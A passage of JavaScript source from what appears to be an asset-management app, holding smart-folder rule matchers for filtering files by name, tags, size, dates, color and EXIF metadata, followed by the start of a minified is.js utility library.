                    tree.folders.push(folder);
                    walkTreeSync(filepath, folder);
                }
                else {
                    if (!junk.is(file)) {
                        tree.files.push(filepath);
                    }
                }
            }
        }
        catch (err) {
            // 某些資料夾可能無法呼叫 statSync 例如 .asar 結尾的
            // console.error(err);
        }
    });

    return tree;
};

function treeDepth (tree, properity, depth, counter) {
    var depth = (depth)? depth : 1;
    var arr;

    tree.depth = depth;

    if (counter.depth < depth) {
        counter.depth = depth;
    }

    tree[properity].forEach(function (node) {
        if (counter.depth < depth + 1) {
            counter.depth = depth + 1;
            counter.path = node.dir;
        }
        treeDepth(node, properity, depth + 1, counter);
        counter.files += node.files.length;
    });
    return depth;
}

function cloneTree (newTree, tree, extraInfo) {
    var arr;
    if (Array.isArray(tree)) {
        arr = tree;
    }
    else {
        arr = tree["children"];
    }
    if (arr && Array.isArray(arr)) {
        arr.forEach(function (node) {
            var newNode = {
                id: node.id,
                name: node.name,
                description: node.description || "",
                children: [],
                modificationTime: node.modificationTime,
                tags: node.tags || [],
                extendTags: node.extendTags,
                icon: node.icon,
                iconColor: node.iconColor,
                pinyin: node.pinyin,
                password: node.password || "",
                passwordTips: node.passwordTips || "",
                coverId: node.coverId,
            };
            if (node.orderBy) {
                newNode.orderBy = node.orderBy;
                newNode.sortIncrease = node.sortIncrease;
            }
            if (extraInfo) {
                newNode.isExpand = node.isExpand;
            }
            newTree.push(newNode);
            cloneTree(newNode.children, node, extraInfo);
        });
    }
}

var devicesMetrics = [
// 竖屏
	{ w: 270, h: 480 },
	{ w: 288, h: 480 },
	// { w: 300, h: 480 },
	// { w: 320, h: 480 },
	{ w: 320, h: 504 },
	{ w: 320, h: 550 },
	{ w: 320, h: 568 },
	{ w: 320, h: 569 },
	{ w: 329, h: 584 },
	{ w: 329, h: 585 },
	// { w: 360, h: 640 },
	{ w: 360, h: 720 },
	{ w: 360, h: 740 },
	{ w: 360, h: 753 },
	{ w: 360, h: 755 },
	{ w: 360, h: 780 },
	{ w: 360, h: 1112 },
	{ w: 375, h: 667 },
	{ w: 375, h: 612 },
	{ w: 375, h: 603 },
	{ w: 375, h: 812 },
	{ w: 384, h: 640 },
	{ w: 384, h: 667 },
	{ w: 384, h: 667 },
	{ w: 390, h: 844 },
	{ w: 392, h: 696 },
	{ w: 400, h: 533 },
	{ w: 400, h: 692 },
	{ w: 400, h: 711 },
	{ w: 411, h: 731 },
	{ w: 412, h: 732 },
	{ w: 414, h: 736 },
	{ w: 414, h: 896 },
	{ w: 428, h: 926 },
	{ w: 430, h: 932 },
	{ w: 434, h: 640 },
	{ w: 450, h: 800 },
	{ w: 480, h: 853 },
	{ w: 480, h: 854 },
	{ w: 540, h: 1066 },
	{ w: 680, h: 360 },
	{ w: 720, h: 360 },
	{ w: 768, h: 1024 },
	{ w: 780, h: 360 },
	{ w: 750, h: 1333 },
    { w: 834, h: 1112 },
// 横屏
	{ h: 270, w: 480 },
	{ h: 288, w: 480 },
	// { h: 300, w: 480 },
	// { h: 320, w: 480 },
	{ h: 320, w: 504 },
	{ h: 320, w: 550 },
	{ h: 320, w: 568 },
	{ h: 320, w: 569 },
	{ h: 329, w: 584 },
	{ h: 329, w: 585 },
	// { h: 360, w: 640 },
	{ h: 360, w: 720 },
	{ h: 360, w: 740 },
	{ h: 360, w: 753 },
	{ h: 360, w: 755 },
	{ h: 360, w: 780 },
	{ h: 360, w: 1112 },
	{ h: 375, w: 667 },
	{ h: 375, w: 612 },
	{ h: 375, w: 603 },
	{ h: 375, w: 812 },
	{ h: 384, w: 640 },
	{ h: 384, w: 667 },
	{ h: 384, w: 667 },
	{ h: 390, w: 844 },
	{ h: 392, w: 696 },
	{ h: 400, w: 533 },
	{ h: 400, w: 692 },
	{ h: 400, w: 711 },
	{ h: 411, w: 731 },
	{ h: 412, w: 732 },
	{ h: 414, w: 736 },
	{ h: 414, w: 896 },
	{ h: 428, w: 926 },
	{ h: 434, w: 640 },
	{ h: 450, w: 800 },
	{ h: 480, w: 853 },
	{ h: 480, w: 854 },
	{ h: 540, w: 1066 },
	{ h: 680, w: 360 },
	{ h: 720, w: 360 },
	{ h: 768, w: 1024 },
	{ h: 780, w: 360 },
	{ h: 750, w: 1333 },
    { h: 834, w: 1112 },
];
var matchStringMethod = {};
matchStringMethod["equal"] = function (name, value) {
	return name === value;
};
matchStringMethod["startWith"] = function (name, value) {
	var isStartWith = new RegExp('^' + value, 'i').test(name);
	return isStartWith;
};
matchStringMethod["endWith"] = function (name, value) {
	var isEndWith = new RegExp(value + '$', 'i').test(name);
	return isEndWith;
};
matchStringMethod["uncontain"] = function (name, value) {
	return name.indexOf(value) === -1;
};
matchStringMethod["contain"] = function (name, value) {
	return name.indexOf(value) !== -1;
};
matchStringMethod["empty"] = function (name, value) {
	return name === "";
};
matchStringMethod["not-empty"] = function (name, value) {
	return name !== "";
};
matchStringMethod["regex"] = function (name, value) {
	try { return new RegExp(value, "g").test(name); }
	catch (err) { return false; }
};

function isMatchNameRule (rule, image) {

	var method = rule.method; 	// equal, startWith, endWith, unequal, contain
	var name = image.name && image.name.toLowerCase();
	var value = rule.value && rule.value.toLowerCase();

	if (!name) name = "";
	if (method!== 'empty' && method !== 'not-empty' && value == '') return false;
	if (matchStringMethod[method]) {
		return matchStringMethod[method](name, value);
	}
	return false;
}

function isMatchFolderNameRule (rule, item) {

	const method = rule.method; 	// equal, startWith, endWith, unequal, contain
	const value = rule.value && rule.value.toLowerCase();

	if (!item?.folders?.length) return false;

	for (let i = 0; i < item.folders.length; i++) {
		const folderId = item.folders[i];
		const folder = $bodyScope.folderMappings[folderId];
		let name = folder?.name;
		if (!name) name = "";
		name = name.toLowerCase();
		if (method!== 'empty' && method !== 'not-empty' && value == '') return false;
		if (matchStringMethod[method]) {
			let isMatch = matchStringMethod[method](name, value);
			if (isMatch) return true;
		}
	}
	
	return false;
}

function isMatchUrlRule (rule, image) {

	var method = rule.method; 	// equal, startWith, endWith, unequal, contain
	var url = image.url && image.url.toLowerCase();
	var value = rule.value && rule.value.toLowerCase();

	if (!url) url = "";
	if (method!== 'empty' && method !== 'not-empty' && value == '') return false;

	if (matchStringMethod[method]) {
		return matchStringMethod[method](url, value);
	}
	return false;
}

function isMatchAnnotationRule (rule, image) {

	var method = rule.method; 	// equal, startWith, endWith, unequal, contain
	var annotation = image.annotation && image.annotation.toLowerCase();
	var value = rule.value && rule.value.toLowerCase();

	if (!annotation) annotation = "";
	if (method!== 'empty' && method !== 'not-empty' && value == '') return false;

	if (matchStringMethod[method]) {
		return matchStringMethod[method](annotation, value);
	}
	return false;
}

function isMatchWidthRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var width = image.width;
		var value1 = rule.value[0];
		var value2 = rule.value[1];

		if (!width && width > 0) return false;

		switch (method) {
			case '=':
				return width === value1;
				break;
			case '>=':
				return width >= value1;
				break;
			case '<=':
				return width <= value1;
				break;
			case '>':
				return width > value1;
				break;
			case '<':
				return width < value1;
				break;
			case 'between':
				return value1 <= width && width <= value2;
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchHeightRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var height = image.height;
		var value1 = rule.value[0];
		var value2 = rule.value[1];

		if (!height && height > 0) return false;

		switch (method) {
			case '=':
				return height === value1;
				break;
			case '>=':
				return height >= value1;
				break;
			case '<=':
				return height <= value1;
				break;
			case '>':
				return height > value1;
				break;
			case '<':
				return height < value1;
				break;
			case 'between':
				return value1 <= height && height <= value2;
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchFileSizeRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var size = image.size;
		var value1 = rule.value[0];
		var value2 = rule.value[1];
		var unit = rule.unit;

		if (unit === 'kb') {
			size = size / 1024;
		}
		else {
			size = size / 1024 / 1024;
		}

		if (!size && size > 0) return false;

		switch (method) {
			case '=':
				return size === value1;
				break;
			case '>=':
				return size >= value1;
				break;
			case '<=':
				return size <= value1;
				break;
			case '>':
				return size > value1;
				break;
			case '<':
				return size < value1;
				break;
			case 'between':
				return value1 <= size && size <= value2;
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchDurationRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var duration = image.duration;

		if (!duration) return false;

		var value1 = rule.value[0];
		var value2 = rule.value[1];
		var unit = rule.unit;

		if (unit === 'h') {
			duration = duration / 60 / 60;
		}
		else if (unit === 'm') {
			duration = duration / 60;
		}

		if (!duration && duration > 0) return false;

		switch (method) {
			case '=':
				return duration === value1;
				break;
			case '>=':
				return duration >= value1;
				break;
			case '<=':
				return duration <= value1;
				break;
			case '>':
				return duration > value1;
				break;
			case '<':
				return duration < value1;
				break;
			case 'between':
				return value1 <= duration && duration <= value2;
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchBPMRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var bpm = image.bpm;

		if (!bpm) return false;

		var value1 = rule.value[0];
		var value2 = rule.value[1];
		var unit = rule.unit;

		if (!bpm) return false;

		switch (method) {
			case '=':
				return bpm === value1;
				break;
			case '>=':
				return bpm >= value1;
				break;
			case '<=':
				return bpm <= value1;
				break;
			case '>':
				return bpm > value1;
				break;
			case '<':
				return bpm < value1;
				break;
			case 'between':
				return value1 <= bpm && bpm <= value2;
				break;
		}
		return false;

	}
	catch (err) {
		return false;
	}
}

function isMatchTimeRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var modificationTime = image.modificationTime;
		var value1 = rule.value[0];
		var value2 = rule.value[1];

		if (!modificationTime) return false;
		var DAY = 1000 * 60 * 60 * 24;
		switch (method) {
			case 'on':
				// 使用 toDateString() 判断同一天
				return new Date(modificationTime).toDateString() == new Date(value1).toDateString();
				break;
			case 'before':
				return modificationTime <= value1 + DAY;
				break;
			case 'after':
				return modificationTime >= value1;
				break;
			case 'between':
				return value1 <= modificationTime && modificationTime <= value2 + DAY;
				break;
			case 'within':
				var days = value1;
				return modificationTime + days * DAY >= Date.now();
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchMTimeRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var mtime = image.mtime || image.modificationTime;
		var value1 = rule.value[0];
		var value2 = rule.value[1];

		if (!mtime) return false;
		var DAY = 1000 * 60 * 60 * 24;
		switch (method) {
			case 'on':
				// 使用 toDateString() 判断同一天
				return new Date(mtime).toDateString() == new Date(value1).toDateString();
				break;
			case 'before':
				return mtime <= value1 + DAY;
				break;
			case 'after':
				return mtime >= value1;
				break;
			case 'between':
				return value1 <= mtime && mtime <= value2 + DAY;
				break;
			case 'within':
				var days = value1;
				return mtime + days * DAY >= Date.now();
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchBTimeRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var btime = image.btime || image.modificationTime;
		var value1 = rule.value[0];
		var value2 = rule.value[1];

		if (!btime) return false;
		var DAY = 1000 * 60 * 60 * 24;
		switch (method) {
			case 'on':
				// 使用 toDateString() 判断同一天
				return new Date(btime).toDateString() == new Date(value1).toDateString();
				break;
			case 'before':
				return btime <= value1 + DAY;
				break;
			case 'after':
				return btime >= value1;
				break;
			case 'between':
				return value1 <= btime && btime <= value2 + DAY;
				break;
			case 'within':
				var days = value1;
				return btime + days * DAY >= Date.now();
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function intersect (arr1, arr2) {
	var temp = {};
	var result = [];
	for (let i = 0; i < arr1.length; i++) { temp[arr1[i]] = true; }
	for (let j = 0; j < arr2.length; j++) { 
		if (temp[arr2[j]] === true) {
			result.push(arr2[j]);
		}
	}
	return result;
}

function isMatchCommentsRule(rule, image) {

	if (!image) { return false; };

	var method = rule.method; 	// intersection, union
	var comments = image.comments;
	var commentString = "";
	var value = rule.value;

	if (method === 'empty') {
		if (!image.comments || image.comments.length === 0) {
			return true;
		}
	}
	else if (method === 'not-empty') {
		if (image.comments && image.comments.length > 0) {
			return true;
		}
	}
	else {

		if (!image || !image.comments) { return false; };

		for(var i = 0; i < comments.length; i++) {
			commentString += comments[i].annotation;
		}
		switch (method) {
			case 'equal':
				return commentString === value;
				break;
			case 'startWith':
				var isStartWith = new RegExp('^' + value, 'i').test(commentString);
				return isStartWith;
				break;
			case 'endWith':
				var isEndWith = new RegExp(value + '$', 'i').test(commentString);
				return isEndWith;
				break;
			case 'uncontain':
				return commentString.indexOf(value) === -1;
				break;
			case 'contain':
				return commentString.indexOf(value) !== -1;
				break;
			case 'regex':
				try { return new RegExp(value, "g").test(commentString); }
				catch (err) { return false; }
				break;
		}
	}
	return false;
}

function isMatchTagsRule (rule, image) {

	if (!image) { return false; };
	if (!image.tags) return false;

	var method = rule.method; 	// intersection, union
	var tags = image.tags;
	var value = rule.value;

	if (method === 'empty') {
		if (!image.tags || image.tags.length === 0) {
			return true;
		}
	}
	else if (method === 'not-empty') {
		if (image.tags && image.tags.length > 0) {
			return true;
		}
	}
	else {
		// 两阵列取交集长度一样表示符合
		var isIntersect = intersect(tags, value).length === value.length && value.length != 0;
		var isUnion = false;
		var isIdentity = false;

		for (var i = 0; i < tags.length; i++) {
			if (value.indexOf(tags[i]) !== -1) {
				isUnion = true;
				break;
			}
		}

		switch (method) {
			case 'intersection':
				return isIntersect;
				break;
			case 'equal':
				return isIntersect && tags.length === value.length;
				break;
			case 'union':
				return isUnion;
			case 'identity':
				return !isUnion;
				break;
		}
	}
    return false;
}


function isMatchFoldersRule (rule, image) {

	if (!image || !image.folders) { return false; };

	var method = rule.method; 	// intersection, union
	var folders = image.folders;
	var value = rule.value;

	if (method === 'empty') {
		if (!folders || folders.length === 0) {
			return true;
		}
	}
	else if (method === 'not-empty') {
		if (folders && folders.length > 0) {
			return true;
		}
	}
	else {
		// 两阵列取交集长度一样表示符合
		var isIntersect = intersect(folders, value).length === value.length;
		var isUnion = false;

		for (var i = 0; i < folders.length; i++) {
			if (value.indexOf(folders[i]) !== -1) {
				isUnion = true;
				break;
			}
		}

		switch (method) {
			case 'intersection':
				return isIntersect;
				break;
			case 'equal':
				return isIntersect && folders.length === value.length;
				break;
			case 'union':
				return isUnion;
				break;
			case 'identity':
					return !isUnion;
					break;
		}
	}
    return false;
}

function isMatchTypeRule (rule, image) {

	var ext = image.ext;
	var result = false;

	if (ext === rule.value) {
		return (rule.method === "equal");
	}

	switch (rule.value) {
		case "videos":
		case "video":
			result = VIDEO_TYPES[ext];
			break;
		case "audio":
			result = AUDIO_TYPES[ext];
			break;
		case "powerpoint":
			if (ext == 'ppt' || ext == 'pptx' || ext == 'potx') result = true;
			break;
		case "presentation":
			if (ext == 'ppt' || ext == 'key' || ext == 'pptx') result = true;
			break;
		case "excel":
			if (ext == 'xls' || ext == 'xlsx') result = true;
			break;
		case "word":
			if (ext == 'doc' || ext == 'docx') result = true;
			break;
		case "font":
			result = FONT_TYPES[ext];
			break;
		case "url":
			if (ext == 'url' && !image.medium) result = true;
			break;
		case "youtube":
			if (ext == 'url' && image.medium == 'youtube') result = true;
			break;
		case "vimeo":
			if (ext == 'url' && image.medium == 'vimeo') result = true;
			break;
		case "bilibili":
			if (ext == 'url' && image.medium == 'bilibili') result = true;
			break;
		default:
			result = (ext === rule.value);
			break;
	}

	switch (rule.method) {
		case 'equal':
			return result;
			break;
		case 'unequal':
			return !result;
			break;
	}
	return false;
}

function isMatchRatingRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var star = image.star || undefined;
		var value = parseInt(rule.value) || undefined;

		switch (method) {
			case 'contain':
				if (rule.value.indexOf('none') === -1) {
					return rule.value.indexOf(star) !== -1;
				}
				else {
					if (rule.value.indexOf(star) !== -1) {
						return true;
					}
					if (rule.value.indexOf("none") !== -1) {
						return true;
					}
					return false;
				}
				break;
			case 'equal':
				if (value !== 'none') {
					return star === value;
				}
				else {
					return star === undefined;
				}
				break;
			case 'unequal':
				if (value !== 'none') {
					return star !== value;
				}
				else {
					return star !== undefined;
				}
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchShapeRule (rule, image) {

	var method = rule.method; 	// equal, startWith, endWith, unequal, contain
	var value = rule.value;
	var width = image.width;
	var height = image.height;
	var isEqual = false;

	if (value !== "custom") {
		let shape;
		if (image.width > image.height) {
			if (image.width > image.height && image.width / image.height >= 2.5) {
				shape = "panoramic-landscape";
			}
			else {
				shape = "landscape";
			}
		}
		else if (image.width < image.height) {
			if (image.width < image.height && image.height / image.width >= 2.5) {
				shape = "panoramic-portrait";
			}
			else {
				shape = "portrait";
			}
		}
		else if (image.width === image.height) {
			shape = "square";
		}

		isEqual = (shape === value);
	}
	else {
		if (!rule.width || !rule.height) return false;
		isEqual = (rule.width / rule.height === width / height);
	}

	if (method === 'equal') {
		return isEqual;
	}
	else {
		return !isEqual;
	}

	return false;
}


var cacheColorMappings = {};
function isMatchColorRule (rule, image) {

	if (!image || !image.palettes) return false;

	if (!cacheColorMappings[rule.value]) {
		cacheColorMappings[rule.value] = hexToRGB(rule.value);
	}

	var method = rule.method;
	var similarColor = cacheColorMappings[rule.value] || hexToRGB(rule.value);
	var palettes = image.palettes;
	var similarity = 20;
    // var white = [255, 255, 255];
    // var black = [0, 0, 0];

	if (method === 'grayscale') {
		if (palettes) {
			for (var i = palettes.length - 1; i >= 0; i--) {
				let palette = palettes[i];
				if (palette.ratio >= 0.02) {
					var r = palette.color[0];
					var g = palette.color[1];
					var b = palette.color[2];
					if ( Math.abs(r-g) >= 8 || Math.abs(r-b) >= 8 || Math.abs(g-b) >= 8 ) {
						return false;
					}
				}
			}
			return true;
		}
		return false;
	}

    if (method === 'accuracy') {
    	similarity = 10;
    }

    if (!similarColor) return true;
    if (!image.palettes || image.palettes.length < 0) return false;
    if (!image.palettes[0]) return false;

    var ratio0 = image.palettes[0].ratio;
    var r0 = image.palettes[0].color[0];
    var g0 = image.palettes[0].color[1];
    var b0 = image.palettes[0].color[2];
    var rt = similarColor[0];
    var gt = similarColor[1];
    var bt = similarColor[2];

    if (ratio0 < 33) {
        return false;
    }

    if (
        r0 - rt > 96 ||
        g0 - gt > 96 ||
        b0 - bt > 96 || 
        r0 - rt < -96 ||
        g0 - gt < -96 ||
        b0 - bt < -96
    ) {
        return false;
    }

	if (image.palettes[0] && image.palettes[1]) {
		if (image.palettes[0].color[0] == similarColor[0] && image.palettes[0].color[1] == similarColor[1] && image.palettes[0].color[2] == similarColor[2] ||
			image.palettes[1].color[0] == similarColor[0] && image.palettes[1].color[1] == similarColor[1] && image.palettes[1].color[2] == similarColor[2]) {
			return true;
		}
	}

	if (image.palettes[0]) {
		if (image.palettes[0].ratio > 33) {
			let d = colorSimilarityDistance(similarColor, image.palettes[0].color);
			if (d.d2000 < similarity &&  d.d76 < similarity + 50) {
				return true;
			}
		}
	}
	
	if (image.palettes[1]) {
		if (image.palettes[1].ratio > 33) {
			let d2 = colorSimilarityDistance(similarColor, image.palettes[1].color);
			if (d2.d2000 < similarity &&  d2.d76 < similarity + 50) {
				return true;
			}
		}
	}
    return false;
}

var colorConvert = require('color-convert');
var DeltaE = require('delta-e');
function colorSimilarityDistance (color1, color2) {
    var c1 = colorConvert.rgb.lab(color1[0], color1[1], color1[2]);
    var c2 = colorConvert.rgb.lab(color2[0], color2[1], color2[2]);
    var l1 = { L: c1[0], A: c1[1], B: c1[2] };
    var l2 = { L: c2[0], A: c2[1], B: c2[2] };
    var d76 = DeltaE.getDeltaE76(l1, l2);
    var d2000 = DeltaE.getDeltaE00(l1, l2);
    return {
    	d76: d76,
    	d2000: d2000,
    };
};

function hexToRGB (hex, alpha) {
    var r = parseInt(hex.slice(1, 3), 16),
        g = parseInt(hex.slice(3, 5), 16),
        b = parseInt(hex.slice(5, 7), 16);
    return [r,g,b];
}

function rgbToHex (r, g, b) {
    if (r === undefined) {
        return false;
    }
    return "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1).toUpperCase();
}

function isMatchCameraRule (rule, image) {

	var method = rule.method; 	// equal, startWith, endWith, unequal, contain
	if (!image.rawMetas || !image.rawMetas.camera) return false;
	var camera = image.rawMetas.camera && image.rawMetas.camera.toLowerCase();
	var value = rule.value && rule.value.toLowerCase();

	if (!camera) camera = "";
	if (method!== 'empty' && method !== 'not-empty' && value == '') return false;

	if (matchStringMethod[method]) {
		return matchStringMethod[method](camera, value);
	}
	return false;
}

function isMatchISORule (rule, image) {
	var method = rule.method; 	// equal, startWith, endWith, unequal, contain
	if (!image.rawMetas || !image.rawMetas.isoSpeed) return false;
	var iso = parseInt(image.rawMetas.isoSpeed);
	var value1 = parseInt(rule.value[0]);
	var value2 = parseInt(rule.value[1]);

	if (!iso && iso > 0) return false;

	switch (method) {
		case '=':
			return iso === value1;
			break;
		case '>=':
			return iso >= value1;
			break;
		case '<=':
			return iso <= value1;
			break;
		case '>':
			return iso > value1;
			break;
		case '<':
			return iso < value1;
			break;
		case 'between':
			return value1 <= iso && iso <= value2;
			break;
	}
	return false;
}

function isMatchApertureRule (rule, image) {
	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		if (!image.rawMetas || !image.rawMetas.aperture) return false;
		var aperture = parseFloat(image.rawMetas.aperture.match(/[+-]?\d+(\.\d+)?/g)[0]);
		var value1 = parseFloat(rule.value[0]);
		var value2 = parseFloat(rule.value[1]);

		if (!aperture && aperture > 0) return false;

		switch (method) {
			case '=':
				return aperture === value1;
				break;
			case '>=':
				return aperture >= value1;
				break;
			case '<=':
				return aperture <= value1;
				break;
			case '>':
				return aperture > value1;
				break;
			case '<':
				return aperture < value1;
				break;
			case 'between':
				return value1 <= aperture && aperture <= value2;
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}

function isMatchFocalLengthRule (rule, image) {

	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		if (!image.rawMetas || !image.rawMetas.focalLength) return false;
		var focalLength = parseFloat(image.rawMetas.focalLength.match(/[+-]?\d+(\.\d+)?/g)[0]);
		var value1 = parseFloat(rule.value[0]);
		var value2 = parseFloat(rule.value[1]);

		if (!focalLength && focalLength > 0) return false;

		switch (method) {
			case '=':
				return focalLength === value1;
				break;
			case '>=':
				return focalLength >= value1;
				break;
			case '<=':
				return focalLength <= value1;
				break;
			case '>':
				return focalLength > value1;
				break;
			case '<':
				return focalLength < value1;
				break;
			case 'between':
				return value1 <= focalLength && focalLength <= value2;
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}


function isMatchShutterRule (rule, image) {

	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		if (!image.rawMetas || !image.rawMetas.shutter) return false;
		var shutter = parseFloat(image.rawMetas.shutter.match(/[+-]?\d+(\.\d+)?/g)[1]);
		var value1 = parseFloat(rule.value[0]);
		var value2 = parseFloat(rule.value[1]);

		if (!shutter && shutter > 0) return false;

		switch (method) {
			case '=':
				return shutter === value1;
				break;
			case '>=':
				return shutter >= value1;
				break;
			case '<=':
				return shutter <= value1;
				break;
			case '>':
				return shutter > value1;
				break;
			case '<':
				return shutter < value1;
				break;
			case 'between':
				return value1 <= shutter && shutter <= value2;
				break;
		}
		return false;
	}
	catch (err) {
		return false;
	}
}


function isMatchTimestampRule (rule, image) {

	var method = rule.method; 	// equal, startWith, endWith, unequal, contain
	if (!image.rawMetas || !image.rawMetas.timestamp) return false;
	var timestamp = parseInt(image.rawMetas.timestamp);
	var value1 = parseInt(rule.value[0]);
	var value2 = parseInt(rule.value[1]);

	if (!timestamp) return false;
	var DAY = 1000 * 60 * 60 * 24;
	switch (method) {
		case 'on':
			// 使用 toDateString() 判断同一天
			return new Date(timestamp).toDateString() == new Date(value1).toDateString();
			break;
		case 'before':
			return timestamp <= value1 + DAY;
			break;
		case 'after':
			return timestamp >= value1;
			break;
		case 'between':
			return value1 <= timestamp && timestamp <= value2 + DAY;
			break;
		case 'within':
			var days = value1;
			return timestamp + days * 1000 * 24 * 60 * 60 >= Date.now();
			break;
	}
	return false;
}

function isMatchFontActivatedRule (rule, image) {

	if (!image || !image.fontMetas) return false;

	try {
		var method = rule.method; 	// equal, startWith, endWith, unequal, contain
		var key = Object.keys(image.fontMetas.postScriptName)[0];
	    var postScriptName = image.fontMetas.postScriptName && image.fontMetas.postScriptName[key];
	    if (!postScriptName) return false;
	    switch (method) {
			case 'activate':
				return installedFonts[`${postScriptName}_.${image.ext}`];
				break;
			case 'deactivate':
				return !installedFonts[`${postScriptName}_.${image.ext}`];
				break;
		}
    }
    catch (err) {
    	return false;
    }

	return false;
}
/*!
 * is.js 0.9.0
 * Author: Aras Atasaygin
 */
(function(n,t){if(typeof define==="function"&&define.amd){define(function(){return n.is=t()})}else if(typeof exports==="object"){module.exports=t()}else{n.is=t()}})(this,function(){var n={};n.VERSION="0.8.0";n.not={};n.all={};n.any={};var t=Object.prototype.toString;var e=Array.prototype.slice;var r=Object.prototype.hasOwnProperty;function a(n){return function(){return!n.apply(null,e.call(arguments))}}function u(n){return function(){var t=c(arguments);var e=t.length;for(var r=0;r<e;r++){if(!n.call(null,t[r])){return false}}return true}}function o(n){return function(){var t=c(arguments);var e=t.length;for(var r=0;r<e;r++){if(n.call(null,t[r])){return true}}return false}}var i={"<":function(n,t){return n<t},"<=":function(n,t){return n<=t},">":function(n,t){return n>t},">=":function(n,t){return n>=t}};function f(n,t){var e=t+"";var r=+(e.match(/\d+/)||NaN);var a=e.match(/^[<>]=?|/)[0];return i[a]?i[a](n,r):n==r||r!==r}function c(t){var r=e.call(t);var a=r.length;if(a===1&&n.array(r[0])){r=r[0]}return r}n.arguments=function(n){return t.call(n)==="[object Arguments]"||n!=null&&typeof n==="object"&&"callee"in n};n.array=Array.isArray||function(n){return t.call(n)==="[object Array]"};n.boolean=function(n){return n===true||n===false||t.call(n)==="[object Boolean]"};n.char=function(t){return n.string(t)&&t.length===1};n.date=function(n){return t.call(n)==="[object Date]"};n.domNode=function(t){return n.object(t)&&t.nodeType>0};n.error=function(n){return t.call(n)==="[object Error]"};n["function"]=function(n){return t.call(n)==="[object Function]"||typeof n==="function"};n.json=function(n){return t.call(n)==="[object Object]"};n.nan=function(n){return n!==n};n["null"]=function(n){return n===null};n.number=function(e){return n.not.nan(e)&&t.call(e)==="[object Number]"};n.object=function(n){return Object(n)===n};n.regexp=function(n){return t.call(n)==="[object RegExp]"};n.sameType=function(e,r){var a=t.call(e);if(a!==t.call(r)){return false}if(a==="[object Number]"){return!n.any.nan(e,r)||n.all.nan(e,r)}return true};n.sameType.api=["not"];n.string=function(n){return t.call(n)==="[object String]"};n.undefined=function(n){return n===void 0};n.windowObject=function(n){return n!=null&&typeof n==="object"&&"setInterval"in n};n.empty=function(t){if(n.object(t)){var e=Object.getOwnPropertyNames(t).length;if(e===0||e===1&&n.array(t)||e===2&&n.arguments(t)){return true}return false}return t===""};n.existy=function(n){return n!=null};n.falsy=function(n){return!n};n.truthy=a(n.falsy);n.above=function(t,e){return n.all.number(t,e)&&t>e};n.above.api=["not"];n.decimal=function(t){return n.number(t)&&t%1!==0};n.equal=function(t,e){if(n.all.number(t,e)){return t===e&&1/t===1/e}if(n.all.string(t,e)||n.all.regexp(t,e)){return""+t===""+e}if(n.all.boolean(t,e)){return t===e}return false};n.equal.api=["not"];n.even=function(t){return n.number(t)&&t%2===0};n.finite=isFinite||function(t){return n.not.infinite(t)&&n.not.nan(t)};n.infinite=function(n){return n===Infinity||n===-Infinity};n.integer=function(t){return n.number(t)&&t%1===0};n.negative=function(t){return n.number(t)&&t<0};n.odd=function(t){return n.number(t)&&t%2===1};n.positive=function(t){return n.number(t)&&t>0};n.under=function(t,e){return n.all.number(t,e)&&t<e};n.under.api=["not"];n.within=function(t,e,r){return n.all.number(t,e,r)&&t>e&&t<r};n.within.api=["not"];var 